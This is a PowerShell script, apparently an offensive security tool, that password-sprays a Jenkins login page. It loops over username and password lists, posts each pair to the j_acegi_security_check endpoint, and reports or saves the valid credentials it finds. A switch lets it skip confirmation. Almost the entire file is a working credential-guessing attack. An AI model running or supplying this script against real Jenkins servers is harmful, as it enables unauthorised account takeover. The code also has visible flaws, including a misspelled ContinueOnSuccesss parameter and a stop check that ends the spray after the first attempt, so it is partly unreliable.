Function Invoke-JenkinsPasswordSpray {

    <#
        .SYNOPSIS
        A script for password spraying web login for Jenkins
        
    
        .DESCRIPTION
        Password sprays Jenkins with specified username and password lists
    
    
        .EXAMPLE
                PS C:\> Invoke-JenkinsPasswordSpray -URL 'http://jenkins:8080/' -UsernameFile '.\usernames.txt' -PasswordFile '.\passwords.txt'
                Password spray the  Jenkins URL with users from usernames.txt and passwords from passwords.txt
    
        .EXAMPLE
                PS C:\> Invoke-JenkinsPasswordSpray -URL 'http://jenkins:8080/' -UsernameFile '.\usernames.txt' -PasswordFile '.\passwords.txt' -ContinueOnSuccess = $True
                Password spray the  Jenkins URL with users from usernames.txt and passwords from passwords.txt, and continue to spray even if a valid login is found
    
        .EXAMPLE
                PS C:\> Invoke-JenkinsPasswordSpray -URL 'http://jenkins:8080/' -Username 'jenkinsadmin' -PasswordFile '.\passwords.txt'
                Password spray the Jenkins URL with the specified user and passwords from passwords.txt
    
        .EXAMPLE
                PS C:\> Invoke-JenkinsPasswordSpray -URL 'http://jenkins:8080/' -UsernameFile '.\usernames.txt' -Password 'jenkinsadmin' -Force -Outfile .\jenkins-sprayed.txt
                Password spray the Jenkins URL with users from usernames.txt and the specified password. Skip confirmation and write successful logins to specified file.
        
    
        .PARAMETER URL
            URL to spray
    
        .PARAMETER UsernameFile
            File containing usernames
    
        .PARAMETER PasswordFile
            File containing usernames
    
        .PARAMETER ContinueOnSuccess
            Continue spraying even when valid login is found
            
        .PARAMETER Force
            Don't ask user for confirmation
        
        .PARAMETER OutFile
            Write to file
    
        .NOTES
            Author: crusher 2019-05-02
        #>
    
    
    [CmdletBinding(
        DefaultParameterSetName = 'UsernameFilePasswordFile',
        PositionalBinding = $True
    )]

    PARAM (
        # Implement parameter set logic to define parameter sets for all different combinations. Yes, this became longer than expected, yikes
        # 1 UsernameFile + PasswordFile
        # 2 UsernameFile + Password
        # 3 Username + PasswordFile
        # 4 Username+ Password
        [Parameter(
            ValueFromPipeline = $true,
            Mandatory = $True,
            Position = 0,
            HelpMessage = 'URL to spray, including port number of the instance. This should be something like http://jenkins:8080. The script handles the rest',
            ParameterSetName = 'UsernameFilePasswordFile'
        )]
        [Parameter(
            ValueFromPipeline = $true,
            Mandatory = $True,
            Position = 0,
            HelpMessage = 'URL to spray, including port number of the instance. This should be something like http://jenkins:8080. The script handles the rest',
            ParameterSetName = 'UsernamePasswordFile'
        )]
        [Parameter(
            ValueFromPipeline = $true,
            Mandatory = $True,
            Position = 0,
            HelpMessage = 'URL to spray, including port number of the instance. This should be something like http://jenkins:8080. The script handles the rest',
            ParameterSetName = 'UsernameFilePassword'
        )]
        [Parameter(
            ValueFromPipeline = $true,
            Mandatory = $True,
            Position = 0,
            HelpMessage = 'URL to spray, including port number of the instance. This should be something like http://jenkins:8080. The script handles the rest',
            ParameterSetName = 'UsernamePassword'
        )]
        [String]
        $URL,
    
        [Parameter(
            Mandatory = $True,
            Position = 1,
            HelpMessage = 'File containing usernames',
            ParameterSetName = 'UsernameFilePasswordFile'
        )]
        [Parameter(
            Mandatory = $True,
            Position = 1,
            HelpMessage = 'File containing usernames',
            ParameterSetName = 'UsernameFilePassword'
        )]
        [String]
        $UsernameFile,
    
        [Parameter(
            Mandatory = $True,
            Position = 2,
            HelpMessage = 'Username',
            ParameterSetName = 'UsernamePasswordFile'
        )]
        [Parameter(
            Mandatory = $True,
            Position = 2,
            HelpMessage = 'Username',
            ParameterSetName = 'UsernamePassword'
        )]
        [String]
        $Username,
    
        [Parameter(
            Mandatory = $True,
            Position = 3,
            HelpMessage = 'File containing passwords',
            ParameterSetName = 'UsernameFilePasswordFile'
        )]
        [Parameter(
            Mandatory = $True,
            Position = 3,
            HelpMessage = 'File containing passwords',
            ParameterSetName = 'UsernamePasswordFile'
        )]
        [String]
        $PasswordFile,
    
    
        [Parameter(
            Mandatory = $True,
            Position = 4,
            HelpMessage = 'Password',
            ParameterSetName = 'UsernameFilePassword'
        )]
        [Parameter(
            Mandatory = $True,
            Position = 4,
            HelpMessage = 'Password',
            ParameterSetName = 'UsernamePassword'
        )]
        [String]
        $Password,
    
        [Parameter(
            Mandatory = $False,
            Position = 5,
            HelpMessage = 'Continue spraying after a valid login has been found. Default is $False',
            ParameterSetName = 'UsernameFilePasswordFile'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 5,
            HelpMessage = 'Continue spraying after a valid login has been found. Default is $False',
            ParameterSetName = 'UsernamePasswordFile'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 5,
            HelpMessage = 'Continue spraying after a valid login has been found. Default is $False',
            ParameterSetName = 'UsernameFilePassword'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 5,
            HelpMessage = 'Continue spraying after a valid login has been found. Default is $False',
            ParameterSetName = 'UsernamePassword'
        )]
        [Bool]
        $ContinueOnSuccesss,
    
        [Parameter(
            Mandatory = $False,
            Position = 6,
            HelpMessage = 'Forces the spray to continue and does not prompt for confirmation.. Default is $False',
            ParameterSetName = 'UsernameFilePasswordFile'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 6,
            HelpMessage = 'Forces the spray to continue and does not prompt for confirmation.. Default is $False',
            ParameterSetName = 'UsernamePasswordFile'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 6,
            HelpMessage = 'Forces the spray to continue and does not prompt for confirmation.. Default is $False',
            ParameterSetName = 'UsernameFilePassword'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 6,
            HelpMessage = 'Forces the spray to continue and does not prompt for confirmation.. Default is $False',
            ParameterSetName = 'UsernamePassword'
        )]
        [switch]
        $Force,

        [Parameter(
            Mandatory = $False,
            Position = 7,
            HelpMessage = 'Writes successful logins to file.',
            ParameterSetName = 'UsernameFilePasswordFile'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 7,
            HelpMessage = 'Writes successful logins to file.',
            ParameterSetName = 'UsernamePasswordFile'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 7,
            HelpMessage = 'Writes successful logins to file.',
            ParameterSetName = 'UsernameFilePassword'
        )]
        [Parameter(
            Mandatory = $False,
            Position = 7,
            HelpMessage = 'Writes successful logins to file.',
            ParameterSetName = 'UsernamePassword'
        )]
        [string]
        $OutFile
    
    )
    
    
    BEGIN {
    
        # Extract hostname and port without http(s):// using regex. Handles subdomains as well.
        $Pattern = "^(([^:/?#]+):)?(//([^/?#]*))?([^?#]*)(\?([^#]*))?(#(.*))?"
        $HostNameAndPort = [regex]::match([String]$URL, $Pattern).Groups[4].Value
        
        # Remove trailing elements and save new URL to variable
        $URLRemovedTrailingElements = [regex]::match([String]$URL, $Pattern).Groups[1].Value + [regex]::match([String]$URL, $Pattern).Groups[3].Value

        # Store the trailing elements in a variable
        $URLTrailingElements = [regex]::match([String]$URL, $Pattern).Groups[5].Value
    
        # Initialize result variable so it's globally accessible
        $Result = ""
    
        # Set counter to 0
        $i = 0

        # Set the URL to use to the provided URL
        $URLToUse = $URL

        if ($URLTrailingElements) {
            Write-Host "[-] Detected trailing elements " -ForegroundColor Yellow -NoNewline
            Write-Host $URLTrailingElements -ForegroundColor Cyan -NoNewline
            Write-Host " in provided URL " -ForegroundColor Yellow -NoNewline
            Write-Host $URL"." -ForegroundColor Cyan
            Write-Host "[-] Will now try to remove it for you." -ForegroundColor Yellow

            # Replace URL if confirmation is accepted
            #$title = "Replace URL"
            $message = "Do you want to use the URL $URLRemovedTrailingElements instead?"
            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Replacing the provided URL."
    
            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Script will continue the provided URL."
    
            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    
            $result = $host.ui.PromptForChoice($title, $message, $options, 0)

            # Cancel the script if No is selected, else: replace the URL
            if ($result -ne 0) {
                Write-Host "[-] Cancelling the password spraying script." -ForegroundColor Yellow
                Break
            }
            else {
                Write-Host "[+] Replacing URL: " -ForegroundColor Yellow -NoNewline
                Write-Host $URL -ForegroundColor Cyan

                # Change the URL
                $URLToUse = $URLRemovedTrailingElements
                Write-Host "[+] Will use this URL: " -ForegroundColor Yellow -NoNewline
                Write-Host $URLToUse -ForegroundColor Cyan
            }
        }
    
        # Check if URL provided by user gives code 200, if not something may be up
        Write-Host "[+] Testing if URL is valid" -ForegroundColor Yellow
        try {
            $TestURL = Invoke-WebRequest $URLToUse"/login?from=%2F"
            if ($TestUrl.StatusCode -eq 200) {
                Write-Host "[+] Provided URL: " -ForegroundColor Green -NoNewline
                Write-Host $URLToUse -ForegroundColor Cyan -NoNewline
                Write-Host " returns 200 OK." -ForegroundColor Green
            }
            else {
                Write-Host "[-] URL returns $($TestURL.StatusCode). URL may not be correct, but script will continue." -ForegroundColor Yellow
            }
        }
        catch {
            Write-Host "[-] URL returns a 40x HTTP status code. The provided URL is " -ForegroundColor Yellow -NoNewline
            Write-Host $URLToUse -ForegroundColor Cyan
            Write-Host "[-] URL should look like " -ForegroundColor Yellow -NoNewline
            Write-Host "http://jenkins:8080" -ForegroundColor Cyan -NoNewline
            Write-Host " without any trailing elements like /login." -ForegroundColor Yellow
        }
    
        # Check if input is UsernameFile or Username. If file: write to array, else:write to string 
        if ($psCmdlet.ParameterSetName -like "*UsernameFile*") {
            $UsernameList = Get-Content $UsernameFile
                    
            # Count the number of usernames in the list
            $UsernameCount = $UsernameList | Measure-Object -Line | Select-Object -ExpandProperty Lines
                    
        }
        else {
            # Set the "list" to the selected username and the count to 1
            $UsernameList = $Username
            $UsernameCount = 1
        }
    
        # Check if input is UsernameFile or Username. If file: write to array, else:write to string 
        if ($psCmdlet.ParameterSetName -like "*PasswordFile*") {
            $PasswordList = Get-Content $PasswordFile
    
            # Count the number of passwords in the list
            $PasswordCount = $PasswordList | Measure-Object -Line | Select-Object -ExpandProperty Lines
        }
        else {
            # Set the "list" to the selected password and the count to 1
            $PasswordList = $Password
            $Passwordcount = 1
        }
            
        # Multiply number of usernames and passwords in list, for tracking progress while spraying
        $RequestCount = $PasswordCount * $UsernameCount
    
        # Jenkins might require a Crumb / anti xsrf token. Get the Crumb token with a request to the crumbissuer and some regex. Commented this out for now as it didn't appear to be necessary.
        #$CrumbObject = Invoke-WebRequest $URLNoTrailingSlash'/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)' | Select-Object -Property Content
        #$CrumbObject
        #$Pattern = "Jenkins-Crumb:(.*?)}"
        #$Crumb = [regex]::match([String]$CrumbObject, $Pattern).Groups[1].Value
    }

    
    PROCESS {

        # Create the header
        $Header = @{
            "Accept"          = "text/html, application/xhtml+xml, image/jxr, */*"
            #"Referer"="$URL/login"
            "Accept-Language" = "en-US"
            "User-Agent"      = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
            "Content-Type"    = "application/x-www-form-urlencoded"
            "Accept-Encoding" = "gzip, deflate"
            "Host"            = "$HostNameAndPort"
            "Pragma"          = "no-cache"
            #"Crumb"           = "$Crumb"
        }
    
        # If no force flag is set, ask the user for confirmation
        if (!$Force) {
            $title = "Confirm Password Spray"
            $message = "Are you sure you want to password spray the URL " + $URLToUse + " with " + $UsernameCount + " accounts and " + $PasswordCount + " passwords?"
            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Attempts to authenticate 1 time per user in the list for each password in the passwords file."
    
            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Cancels the password spray."
    
            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
    
            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
    
            if ($result -ne 0) {
                Write-Host "[-] Cancelling the password spray." -ForegroundColor Yellow
                Break
            }
        }
    
        # Provide output
        $time = Get-Date
        Write-Host ""
        Write-Host "[+] Start password spraying the URL " -ForegroundColor Yellow -NoNewline
        Write-Host $URLRemovedTrailingElements -ForegroundColor Cyan -NoNewline
        Write-Host " with $UsernameCount user(s) and $PasswordCount password(s). Total request count is $Requestcount. Current time is $($time.ToShortTimeString()). Successful logins will be written to " -ForegroundColor Yellow -NoNewline
        Write-Host $OutFile -ForegroundColor Cyan
    
        # Loop over passwords
        foreach ($PasswordAttempt in $PasswordList) {
    
            <# Loop over usernames so that each password is tried for all users.
                I consider this more efficient based on the assumption that there
                are more passwords than users. #>
            foreach ($UsernameAttempt in $UsernameList) {
    
                #Reset the results
                $Result = ""
    
                # Simple counter to track the total number of attempts
                $i++
    
                # Declare the body
                $Body = @{
                    "j_username" = "$UsernameAttempt"
                    "j_password" = "$PasswordAttempt"
                    "from"       = ""
                    "Submit"     = "Sign+in"
                }

                # Write progess in the format of 1/100 and what password is trying
                Write-Host "[Attempt $i / $RequestCount] - Spraying username:$UsernameAttempt with password:$PasswordAttempt"

                # Have to use a try/catch because Invoke-Webrequest goes into an error state on status code 40x. Any non-error that leads to 200 should be a valid login.
                try {

                    # Send the actual request and store the result in a variable
                    $Result = Invoke-WebRequest -UseBasicParsing "$URLRemovedTrailingElements/j_acegi_security_check" -Method POST -Body $Body -Header $Header
                

                    # If we get something that is not 40x, we have some kind of success. Verify the code to be 200
                    if ($Result.StatusCode -eq 200) {
                        Write-Host "[+] SUCCESS! " -ForegroundColor Green -NoNewline
                        Write-Host "Username:" -NoNewline -ForegroundColor Cyan
                        write-Host $UsernameAttempt -ForegroundColor Magenta -NoNewline
                        Write-Host " Password:"  -ForegroundColor Cyan -NoNewline 
                        Write-Host $PasswordAttempt -ForegroundColor Magenta

                        # Write to file
                        if ($OutFile -ne "") {
                            Add-Content $OutFile $UsernameAttempt`:$PasswordAttempt
                        }
                    }

                    # If we get something that is not 40x or 200, we continue.
                    else {
                        Write-Host "[-] Got a status code that is not 40x, but $($Result.StatusCode), which is not 200. Could be a redirector similar. Spraying will continue"  -ForegroundColor Yellow
                    }
                }
                catch {
                    # An error occurred or Invoke-Webrequest got a status code 40x, but purposefully dont't print anything to avoid spamming output during spraying
                }  
                    
                # Stop spraying if ContinueOnSuccess is not equal to True (default is $False) - else, continue
                if ($ContinueOnSuccesss -eq $False) {
                    Write-Host "The ContinueOnSuccess parameter is set to " -NoNewline -ForegroundColor Yellow
                    Write-Host $ContinueOnSuccesss -NoNewLine -ForegroundColor Cyan
                    Write-Host " or not set. Spraying will now stop" -ForegroundColor Yellow
                    Return
                }
                        
            }
        } 
        # Exiting the outer loop indicates a completed state
        # Insert a blank line for readbility
        Write-Host ""
        Write-Host "[+] Password spraying is complete" -ForegroundColor Yellow
        
        #Write to file
        if ($OutFile -ne "") {
            Write-Host -ForegroundColor Yellow "[+] Any passwords that were successfully sprayed have been written to $OutFile"
        }
    }
}